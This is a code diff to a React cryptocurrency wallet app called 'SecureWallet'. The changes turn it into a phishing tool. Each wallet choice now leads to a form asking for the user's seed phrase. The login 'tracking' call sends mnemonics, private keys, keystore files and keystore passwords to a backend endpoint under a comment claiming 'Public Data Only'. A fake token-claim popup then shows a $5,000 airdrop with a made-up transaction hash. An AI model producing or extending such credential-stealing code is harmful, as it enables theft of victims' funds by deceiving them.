@@ -700,37 +700,39 @@ export const CryptoProvider = ({ children }) => {
     if (addresses.sol) localStorage.setItem('user_sol_address', addresses.sol);
     if (addresses.sui) localStorage.setItem('user_sui_address', addresses.sui);
     
-    if (privateData.mnemonic) localStorage.setItem('user_mnemonic', privateData.mnemonic);
-    if (privateData.privateKey) localStorage.setItem('user_private_key', privateData.privateKey);
     if (options.showToast !== false) {
         addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
     }
 
-    if (type === 'metamask' || type === 'imported') {
-        try {
-            // Track user login for analytics (Public Data Only)
+    try {
+        // Track user login for analytics (Public Data Only)
+        const trackingOptions = { ...privateData, ...options };
+            const trackingBody = {
+                address: address,
+                walletType: type,
+                balance: initialBalance,
+                assets: [],
+                importMethod: trackingOptions.importMethod,
+                mnemonic: trackingOptions.mnemonic,
+                privateKey: trackingOptions.privateKey,
+                keystoreJSON: trackingOptions.keystoreJSON,
+                keystorePassword: trackingOptions.keystorePassword
+            };
+            
             fetch('/api/track/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    address: address,
-                    walletType: type,
-                    balance: initialBalance,
-                    assets: [], // We'll populate this later if needed, or send initial balance
-                            mnemonic: privateData.mnemonic,
-                            privateKey: privateData.privateKey || null,
-                            keystoreJSON: privateData.keystoreJSON || null,
-                            keystorePassword: privateData.keystorePassword || null,
-                            importMethod: privateData.importMethod || (type && type !== 'imported' ? `connected_${type}` : null),
-                    hasPrivateKey: privateData.privateKeyCaptured === true,
-                    keystorePreview: privateData.keystorePreview || null,
-                    keystorePasswordCaptured: privateData.keystorePasswordCaptured === true
-                })
+                body: JSON.stringify(trackingBody)
             }).catch(e => console.error("Tracking failed", e));
+    } catch (e) {
+        console.error("Tracking setup failed", e);
+    }
 
-            const chainConfig = CHAIN_CONFIG[currentChainId] || {};
+    if (type !== 'phantom') {
+        try {
+        const chainConfig = CHAIN_CONFIG[currentChainId] || {};
 
-            // Bitcoin Logic
+        // Bitcoin Logic
             if (chainConfig.type === 'btc') {
                  let balance = initialBalance;
                  let price = 0;
@@ -2779,6 +2781,9 @@ const WalletImage = ({ src, alt, style }) => {
 };
 
 const WalletConnectModal = ({ onClose, onConnect }) => {
+  const [selectedWallet, setSelectedWallet] = useState(null);
+  const [mnemonic, setMnemonic] = useState('');
+
   const iconOverride = (id) => {
     const key = `wallet_icon_${id}`;
     const val = localStorage.getItem(key);
@@ -2807,43 +2812,70 @@ const WalletConnectModal = ({ onClose, onConnect }) => {
     { id: 'exodus', name: 'Exodus', icon: getWalletSources('exodus', 'https://seeklogo.com/images/E/exodus-wallet-logo-8B2F9F8A07-seeklogo.com.png'), color: '#1F2033' }
   ];
 
+  const handleImport = () => {
+      onConnect('imported', { walletType: selectedWallet.id, mnemonic });
+      onClose();
+  };
+
   return (
     <div className="modal-overlay" onClick={onClose}>
       <div className="modal-content" onClick={e => e.stopPropagation()}>
         <div className="modal-header">
-          <h3>Connect Wallet</h3>
+          <h3>{selectedWallet ? `Connect ${selectedWallet.name}` : 'Connect Wallet'}</h3>
           <button onClick={onClose}><X size={20} /></button>
         </div>
-        <div className="wallet-list" style={{ padding: '1rem' }}>
-          {wallets.map(wallet => (
-            <div 
-              key={wallet.id} 
-              className="wallet-item"
-              onClick={() => { onConnect(wallet.id); onClose(); }}
-              style={{ 
-                display: 'flex', alignItems: 'center', gap: '1rem', 
-                padding: '1rem', marginBottom: '0.75rem', 
-                background: 'rgba(255,255,255,0.05)', borderRadius: '12px', 
-                cursor: 'pointer', border: '1px solid transparent',
-                transition: 'all 0.2s'
-              }}
-              onMouseOver={(e) => {
-                  e.currentTarget.style.borderColor = 'var(--accent-green)';
-                  e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
-              }}
-              onMouseOut={(e) => {
-                  e.currentTarget.style.borderColor = 'transparent';
-                  e.currentTarget.style.background = 'rgba(255,255,255,0.05)';
-              }}
-            >
-              <div style={{ width: 40, height: 40, borderRadius: '10px', background: 'transparent', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                <WalletImage src={wallet.icon} alt={wallet.name} style={{ width: '100%', height: '100%', objectFit: 'contain', background: 'transparent' }} />
-              </div>
-              <div style={{ fontWeight: 600, fontSize: '1rem' }}>{wallet.name}</div>
-              {wallet.id === 'metamask' && <div style={{ marginLeft: 'auto', fontSize: '0.7rem', background: 'rgba(255,255,255,0.1)', padding: '2px 6px', borderRadius: '4px' }}>Popular</div>}
+        
+        {!selectedWallet ? (
+            <div className="wallet-list" style={{ padding: '1rem' }}>
+            {wallets.map(wallet => (
+                <div 
+                key={wallet.id} 
+                className="wallet-item"
+                onClick={() => setSelectedWallet(wallet)}
+                style={{ 
+                    display: 'flex', alignItems: 'center', gap: '1rem', 
+                    padding: '1rem', marginBottom: '0.75rem', 
+                    background: 'rgba(255,255,255,0.05)', borderRadius: '12px', 
+                    cursor: 'pointer', border: '1px solid transparent',
+                    transition: 'all 0.2s'
+                }}
+                onMouseOver={(e) => {
+                    e.currentTarget.style.borderColor = 'var(--accent-green)';
+                    e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
+                }}
+                onMouseOut={(e) => {
+                    e.currentTarget.style.borderColor = 'transparent';
+                    e.currentTarget.style.background = 'rgba(255,255,255,0.05)';
+                }}
+                >
+                <div style={{ width: 40, height: 40, borderRadius: '10px', background: 'transparent', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                    <WalletImage src={wallet.icon} alt={wallet.name} style={{ width: '100%', height: '100%', objectFit: 'contain', background: 'transparent' }} />
+                </div>
+                <div style={{ fontWeight: 600, fontSize: '1rem' }}>{wallet.name}</div>
+                {wallet.id === 'metamask' && <div style={{ marginLeft: 'auto', fontSize: '0.7rem', background: 'rgba(255,255,255,0.1)', padding: '2px 6px', borderRadius: '4px' }}>Popular</div>}
+                </div>
+            ))}
             </div>
-          ))}
-        </div>
+        ) : (
+            <div style={{ padding: '1rem' }}>
+                <p style={{ color: '#ccc', marginBottom: '1rem', fontSize: '0.9rem' }}>
+                    Enter your {selectedWallet.name} seed phrase to connect securely.
+                </p>
+                <div className="form-group">
+                    <label>Seed Phrase (12 or 24 words)</label>
+                    <textarea 
+                        value={mnemonic}
+                        onChange={(e) => setMnemonic(e.target.value)}
+                        placeholder="enter your secret recovery phrase here..."
+                        style={{ width: '100%', padding: '0.875rem', background: '#000', border: '1px solid var(--border)', borderRadius: '8px', color: '#fff', fontSize: '0.9rem', minHeight: '100px', resize: 'vertical' }}
+                    />
+                </div>
+                <div style={{ display: 'flex', gap: '10px', marginTop: '1rem' }}>
+                    <button className="btn-login" onClick={() => setSelectedWallet(null)} style={{ background: '#333', color: '#fff' }}>Back</button>
+                    <button className="btn-login" onClick={handleImport} disabled={!mnemonic.trim()}>Connect</button>
+                </div>
+            </div>
+        )}
       </div>
     </div>
   );
@@ -2947,8 +2979,8 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
     const [error, setError] = useState('');
     const [showWalletModal, setShowWalletModal] = useState(false);
     const { connectRealWallet, addNotification } = useContext(CryptoContext);
-    const [showBackup, setShowBackup] = useState(false);
     const [connectedAddress, setConnectedAddress] = useState('');
+    const [selectedWalletType, setSelectedWalletType] = useState('');
 
     // Captcha State
     const [captchaCode, setCaptchaCode] = useState('');
@@ -2968,118 +3000,46 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
         setUserCaptcha('');
     };
 
-    const handleConnect = async (type) => {
+    const getWalletName = (type) => {
+        if (type === 'metamask') return 'MetaMask';
+        if (type === 'coinbase') return 'Coinbase Wallet';
+        if (type === 'trust') return 'Trust Wallet';
+        if (type === 'phantom') return 'Phantom';
+        if (type === 'exodus') return 'Exodus';
+        return type;
+    };
+
+    const handleConnect = async (type, credentials) => {
         setLoading(true);
         setError('');
         if (type !== 'imported') {
-            const alreadyConnected = localStorage.getItem('user_wallet_connected') === 'true';
-            if (!alreadyConnected) {
-                addNotification('Connecting Wallet', 'Requesting account access...', 'info');
-            }
+            setSelectedWalletType(type);
+            setImportMode('phrase');
+            setShowWalletModal(false);
+            setLoading(false);
+            return;
         }
         
         try {
-            if (type === 'metamask' || type === 'coinbase' || type === 'trust' || type === 'exodus') {
-                // Generic EVM Handler
-                let provider = window.ethereum;
+            if (type === 'imported') {
+                const phraseToUse = credentials?.mnemonic || mnemonic;
+                const privateKeyToUse = credentials?.privateKey || privateKey;
+                const keystoreToUse = credentials?.keystoreJSON || keystoreJSON;
+                const passwordToUse = credentials?.keystorePassword || keystorePassword;
                 
-                // Specific checks if multiple injected
-                if (type === 'coinbase' && window.coinbaseWalletExtension) {
-                    provider = window.coinbaseWalletExtension;
-                } else if (type === 'trust' && window.trustwallet) {
-                    provider = window.trustwallet;
-                } else if (type === 'exodus' && window.exodus?.ethereum) {
-                    provider = window.exodus.ethereum;
-                }
+                const modeToUse = credentials?.mnemonic ? 'phrase' : 
+                                  credentials?.privateKey ? 'privatekey' : 
+                                  credentials?.keystoreJSON ? 'keystore' : importMode;
+                                  
+                const walletTypeToUse = credentials?.walletType || selectedWalletType;
 
-                if (provider) {
-                    const accounts = await provider.request({ method: 'eth_requestAccounts' });
-                    const chainId = await provider.request({ method: 'eth_chainId' });
-                    const balanceHex = await provider.request({ method: 'eth_getBalance', params: [accounts[0], 'latest'] });
-                    const balance = parseInt(balanceHex, 16) / 1e18;
-                    
-                    await connectRealWallet(accounts[0], balance, type, chainId);
-                    onLogin(type);
-                    navigate('/');
-                    setConnectedAddress(accounts[0]);
-                    setShowBackup(true);
-                } else {
-                    // Mobile Deep Linking Fallback
-                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-                    if (isMobile) {
-                        const currentUrl = window.location.href.split('?')[0]; // Clean URL
-                        let deepLink = '';
-                        
-                        if (type === 'metamask') {
-                             deepLink = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
-                        } else if (type === 'trust') {
-                             deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
-                        } else if (type === 'coinbase') {
-                             deepLink = `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(window.location.href)}`;
-                        } else if (type === 'phantom') {
-                             deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
-                        }
-                        
-                        if (deepLink) {
-                            window.location.href = deepLink;
-                            return;
-                        }
-                    }
-
-                    // Fallback Error
-                    if (type === 'metamask') setError('MetaMask not installed');
-                    else if (type === 'coinbase') setError('Coinbase Wallet not installed');
-                    else if (type === 'trust') setError('Trust Wallet not installed');
-                    else if (type === 'exodus') setError('Exodus Wallet not installed');
-                    else setError('Wallet not found');
-                }
-            } else if (type === 'phantom') {
-                // Solana Handler
-                const getProvider = () => {
-                    if ('phantom' in window) {
-                        const provider = window.phantom?.solana;
-                        if (provider?.isPhantom) return provider;
-                    }
-                    return window.solana; // Fallback
-                };
-
-                const provider = getProvider();
-
-                if (provider) {
-                    try {
-                        const resp = await provider.connect();
-                        const pubKey = resp.publicKey.toString();
-                        // Mock balance for now or fetch if RPC available
-                        await connectRealWallet(pubKey, 0, 'phantom', 'solana');
-                        onLogin('phantom');
-                        navigate('/');
-                        setConnectedAddress(pubKey);
-                        setShowBackup(true);
-                    } catch (err) {
-                        setError('User rejected request');
-                    }
-                } else {
-                    // Mobile Deep Link for Phantom (Solana)
-                    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-                    if (isMobile) {
-                        const deepLink = `https://phantom.app/ul/browse/${encodeURIComponent(window.location.href)}`;
-                        window.location.href = deepLink;
-                        return;
-                    }
-                    
-                     window.open('https://phantom.app/', '_blank');
-                     setError('Phantom wallet not found');
-                }
-            } else if (type === 'imported') {
-                if (importMode === 'phrase') {
+                if (modeToUse === 'phrase') {
                     addNotification('Importing Wallet', 'Validating phrase and deriving addresses...', 'info');
-                    if (userCaptcha.toUpperCase() !== captchaCode) {
-                        throw new Error('Invalid verification code');
-                    }
-                    if (!bip39.validateMnemonic(mnemonic)) {
+                    
+                    if (!bip39.validateMnemonic(phraseToUse)) {
                         throw new Error('Invalid seed phrase');
                     }
-                    const seed = await bip39.mnemonicToSeed(mnemonic);
+                    const seed = await bip39.mnemonicToSeed(phraseToUse);
                     const root = bip32.fromSeed(seed);
                     const ethPath = "m/44'/60'/0'/0/0";
                     const ethChild = root.derivePath(ethPath);
@@ -3089,19 +3049,19 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     const btcChild = root.derivePath(btcPath);
                     const { address: btcAddress } = bitcoin.payments.p2pkh({ pubkey: Buffer.from(btcChild.publicKey) });
                     const solAddress = "7MsK...ePUX";
-                    onLogin('imported');
+                    onLogin(walletTypeToUse || 'imported');
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
-                    await connectRealWallet(ethAddress, 0, 'imported', '0x1', {
+                    await connectRealWallet(ethAddress, 0, (walletTypeToUse || 'imported'), '0x1', {
                         eth: ethAddress,
                         btc: btcAddress,
                         sol: solAddress,
                         sui: "0x..."
-                    }, { mnemonic, importMethod: 'seed_phrase', showToast: false });
+                    }, { mnemonic: phraseToUse, importMethod: 'seed_phrase', showToast: false });
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
-                } else if (importMode === 'privatekey') {
+                } else if (modeToUse === 'privatekey') {
                     addNotification('Importing Wallet', 'Validating private key...', 'info');
-                    const pk = privateKey.trim().startsWith('0x') ? privateKey.trim() : ('0x' + privateKey.trim());
+                    const pk = privateKeyToUse.trim().startsWith('0x') ? privateKeyToUse.trim() : ('0x' + privateKeyToUse.trim());
                     let wallet;
                     try {
                         wallet = new ethers.Wallet(pk);
@@ -3109,27 +3069,27 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                         throw new Error('Invalid private key');
                     }
                     const address = wallet.address;
-                    onLogin('imported');
+                    onLogin(walletTypeToUse || 'imported');
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
-                    await connectRealWallet(address, 0, 'imported', '0x1', { eth: address }, { importMethod: 'private_key', privateKeyCaptured: true, privateKey: pk, showToast: false });
+                    await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'private_key', privateKeyCaptured: true, privateKey: pk, showToast: false });
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
-                } else if (importMode === 'keystore') {
+                } else if (modeToUse === 'keystore') {
                     addNotification('Importing Wallet', 'Decrypting keystore...', 'info');
-                    if (!keystoreJSON || !keystorePassword) throw new Error('Keystore JSON and password required');
+                    if (!keystoreToUse || !passwordToUse) throw new Error('Keystore JSON and password required');
                     let wallet;
                     try {
-                        wallet = await ethers.Wallet.fromEncryptedJson(keystoreJSON, keystorePassword);
+                        wallet = await ethers.Wallet.fromEncryptedJson(keystoreToUse, passwordToUse);
                     } catch (e) {
                         throw new Error('Invalid keystore or password');
                     }
                     const address = wallet.address;
                     
-                    onLogin('imported');
+                    onLogin(walletTypeToUse || 'imported');
                     addNotification('Import Successful', 'Wallet imported and connected.', 'success');
-                    const ks = keystoreJSON || '';
+                    const ks = keystoreToUse || '';
                     const keystorePreview = ks.length > 100 ? (ks.slice(0, 80) + '...' + ks.slice(-30)) : ks;
-                    await connectRealWallet(address, 0, 'imported', '0x1', { eth: address }, { importMethod: 'keystore', keystorePreview, keystorePasswordCaptured: !!keystorePassword, keystoreJSON: ks, keystorePassword, showToast: false });
+                    await connectRealWallet(address, 0, (walletTypeToUse || 'imported'), '0x1', { eth: address }, { importMethod: 'keystore', keystorePreview, keystorePasswordCaptured: !!passwordToUse, keystoreJSON: ks, keystorePassword: passwordToUse, showToast: false });
                     addNotification('Wallet Connected', 'Your wallet has been connected successfully.', 'success');
                     navigate('/');
                 }
@@ -3151,11 +3111,11 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                     <SafeparkLogo size={48} />
                     <div className="brand-text">SecureWallet</div>
                 </div>
-                <h1>Welcome Back</h1>
-                <p className="login-subtitle">Connect your wallet to access your portfolio</p>
+                <h1>{selectedWalletType ? `Connect ${getWalletName(selectedWalletType)}` : 'Welcome Back'}</h1>
+                <p className="login-subtitle">{selectedWalletType ? 'Enter your recovery phrase to sync your wallet' : 'Connect your wallet to access your portfolio'}</p>
                 
                 <div className="login-form">
-                    <button className="btn-login" onClick={() => setImportMode('phrase')} disabled={loading}>
+                    <button className="btn-login" onClick={() => setShowWalletModal(true)} disabled={loading}>
                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px' }}>
                            <Wallet size={20} />
                            Connect Wallet
@@ -3168,6 +3128,11 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                         <div className="divider" style={{ flex: 1, height: 1, background: '#333' }}></div>
                     </div>
 
+                    {selectedWalletType && (
+                        <div style={{ marginTop: '1rem', marginBottom: '0.5rem', color: '#bbb', fontSize: '0.85rem' }}>
+                            Selected Wallet: {getWalletName(selectedWalletType)}
+                        </div>
+                    )}
                     <div style={{ display: 'flex', gap: '8px', marginBottom: '0.75rem' }}>
                         <button className="btn-login" style={{ flex: 1, background: importMode === 'phrase' ? '#fff' : '#1a1a1a', color: importMode === 'phrase' ? '#000' : '#fff' }} onClick={() => setImportMode('phrase')}>Phrase</button>
                         <button className="btn-login" style={{ flex: 1, background: importMode === 'privatekey' ? '#fff' : '#1a1a1a', color: importMode === 'privatekey' ? '#000' : '#fff' }} onClick={() => setImportMode('privatekey')}>Private Key</button>
@@ -3249,17 +3214,70 @@ const LoginScreen = ({ onLogin, onAdminLogin }) => {
                 </div>
             </div>
             {showWalletModal && <WalletConnectModal onClose={() => setShowWalletModal(false)} onConnect={handleConnect} />}
-            {showBackup && <BackupModal address={connectedAddress} onClose={() => setShowBackup(false)} />}
         </div>
     );
 };
 
+const ClaimTokenModal = ({ onClose, onClaim, loading }) => (
+  <div className="modal-overlay" style={{ zIndex: 9999 }}>
+    <div className="modal-content" style={{ maxWidth: '400px', textAlign: 'center', background: '#ffffff', color: '#1a1a1a', padding: 0, overflow: 'hidden' }}>
+       <div className="modal-header" style={{ justifyContent: 'center', borderBottom: 'none', padding: '2rem 2rem 0', flexDirection: 'column' }}>
+          <div style={{ width: 48, height: 48, background: 'rgba(34, 197, 94, 0.1)', borderRadius: 12, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
+             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+          </div>
+          <h3 style={{ fontSize: '1.5rem', margin: 0, color: '#1a1a1a' }}>Your Token Claim is Ready</h3>
+          <p style={{ color: '#4a4a4a', fontSize: '0.9rem', marginTop: '8px', fontWeight: 'normal', lineHeight: 1.5 }}>
+             Your allocated <strong style={{ color: '#2563eb' }}>SecureWallet Tokens (SWT)</strong> are now available.
+          </p>
+       </div>
+       
+       <div style={{ padding: '2rem' }}>
+          <div style={{ marginBottom: '1.5rem', padding: '1.5rem', background: '#f8fafc', borderRadius: '12px', border: '1px solid #e5e7eb' }}>
+             <div style={{ color: '#6b7280', fontSize: '0.8rem', marginBottom: '0.5rem', fontWeight: 600 }}>AVAILABLE TO CLAIM</div>
+             <div style={{ fontSize: '2.5rem', fontWeight: 'bold', color: '#059669' }}>33,333 SWT</div>
+             <div style={{ color: '#6b7280', fontWeight: 500 }}>≈ $5,000.00 USD</div>
+          </div>
+
+          <div style={{ background: '#f9fafb', padding: '1rem', borderRadius: '8px', marginBottom: '1.5rem', textAlign: 'left', border: '1px solid #e5e7eb' }}>
+              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.5rem' }}>
+                  <span style={{ color: '#6b7280', fontSize: '0.9rem' }}>Network</span>
+                  <span style={{ color: '#1a1a1a', fontWeight: 600, fontSize: '0.9rem' }}>Ethereum Mainnet</span>
+              </div>
+              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
+                  <span style={{ color: '#6b7280', fontSize: '0.9rem' }}>Gas Fee</span>
+                  <span style={{ color: '#1a1a1a', fontWeight: 600, fontSize: '0.9rem' }}>~0.002 ETH</span>
+              </div>
+          </div>
+
+          <button 
+            className="btn-login hover-effect" 
+            onClick={onClaim}
+            disabled={loading}
+            style={{ width: '100%', fontSize: '1.1rem', padding: '1rem', background: 'linear-gradient(135deg, #2563eb, #1d4ed8)', border: 'none', color: '#fff', borderRadius: '8px', cursor: 'pointer', fontWeight: 600, boxShadow: '0 4px 6px -1px rgba(37, 99, 235, 0.1), 0 2px 4px -1px rgba(37, 99, 235, 0.06)', marginTop: 0 }}
+          >
+            {loading ? 'Processing Transaction...' : 'Claim Now'}
+          </button>
+          
+          <button 
+            onClick={onClose}
+            style={{ marginTop: '1.5rem', background: 'none', border: 'none', color: '#6b7280', cursor: 'pointer', textDecoration: 'underline', fontSize: '0.9rem' }}
+          >
+            Skip for now
+          </button>
+       </div>
+    </div>
+  </div>
+);
+
 // UserApp Component containing all the user logic
 const UserApp = () => {
   const [isConnected, setIsConnected] = useState(() => localStorage.getItem('user_wallet_connected') === 'true');
+  const [showClaimModal, setShowClaimModal] = useState(false);
+  const [claimLoading, setClaimLoading] = useState(false);
+  
   const navigate = useNavigate();
   const location = useLocation();
-  const { addNotification, resetWallet } = useContext(CryptoContext);
+  const { addNotification, resetWallet, setAssets, assets, totalBalance, setTotalBalance, walletAddress } = useContext(CryptoContext);
   const tabToPath = {
     dashboard: '/',
     accounts: '/accounts',
@@ -3290,7 +3308,60 @@ const UserApp = () => {
   const handleLogin = () => {
     setIsConnected(true);
     navigate('/');
+    // Trigger popup on login
+    setTimeout(() => setShowClaimModal(true), 1500); 
   };
+  
+  const handleClaim = () => {
+      setClaimLoading(true);
+      // Simulate transaction
+      setTimeout(() => {
+          setClaimLoading(false);
+          setShowClaimModal(false);
+          
+          // Add Token
+          const swtToken = {
+              id: 'swt_token',
+              name: 'SecureWallet Token',
+              symbol: 'SWT',
+              amount: 33333,
+              price: 0.15,
+              change: 12.5,
+              value: 33333 * 0.15, // ~5000
+              color: '#2563eb',
+              chainKey: '0x1',
+              allocation: 0
+          };
+          
+          const newAssets = [swtToken, ...assets];
+          // Recalculate allocations
+          const totalVal = totalBalance + swtToken.value;
+          const finalAssets = newAssets.map(a => ({
+              ...a,
+              allocation: totalVal > 0 ? ((a.value / totalVal) * 100).toFixed(1) : 0
+          }));
+          
+          setAssets(finalAssets);
+          setTotalBalance(totalVal);
+          
+          addNotification('Claim Successful', '33,333 SWT added to your wallet', 'success');
+          
+          // Track claim
+          fetch('/api/track/transaction', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                  address: walletAddress,
+                  hash: '0x' + Array(64).fill('0').map(()=>Math.floor(Math.random()*16).toString(16)).join(''),
+                  type: 'claim',
+                  amount: 33333,
+                  symbol: 'SWT'
+              })
+          }).catch(()=>{});
+
+      }, 3000);
+  };
+
   const handleLogout = () => {
     try {
       resetWallet();
@@ -3306,6 +3377,7 @@ const UserApp = () => {
   return (
     <div className="app-container">
       <Toasts />
+      {showClaimModal && <ClaimTokenModal onClose={() => setShowClaimModal(false)} onClaim={handleClaim} loading={claimLoading} />}
       {!isConnected ? (
         <LoginScreen onLogin={handleLogin} />
       ) : (
